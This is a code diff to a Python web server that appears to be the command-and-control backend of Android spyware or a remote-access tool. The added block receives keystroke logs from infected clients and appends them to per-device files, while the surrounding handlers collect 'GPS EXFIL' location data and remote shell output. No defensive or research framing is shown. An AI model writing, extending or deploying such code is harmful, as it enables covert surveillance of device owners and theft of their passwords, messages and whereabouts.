@@ -106,10 +106,26 @@ async def commander_push(client_id: str, action: str, payload: dict = {}):
 async def report_output(client_id: str, request: Request):
     data = await request.json()
     
-    # Distinguish between location updates and shell output
     report_type = data.get("type", "shell_output")
     content = data.get("data") or data.get("output") or "No output"
     
+    # --- ADDED: KEYLOG CATCHER FOR ANDROID ---
+    if report_type == "keylog":
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        # Try every possible key the client might send
+        content = data.get("data") or data.get("payload") or data.get("content") or "NO_DATA_RECEIVED"
+        
+        print(f"\n⌨️ [KEYLOG] {client_id}: {content}")
+        
+        log_dir = os.path.join(UPLOAD_DIR, client_id)
+        os.makedirs(log_dir, exist_ok=True)
+        
+        with open(os.path.join(log_dir, "keys.txt"), "a", encoding="utf-8") as f:
+            # Only write if it's not the empty placeholder
+            if content != "NO_DATA_RECEIVED":
+                f.write(f"[{now}] {content}\n")
+
+    # --- EXISTING LOGIC FOR GPS AND SHELL ---
     if report_type == "location_update":
         print(f"\n📍 [GPS EXFIL] FROM {client_id}:")
         print("-" * 40)
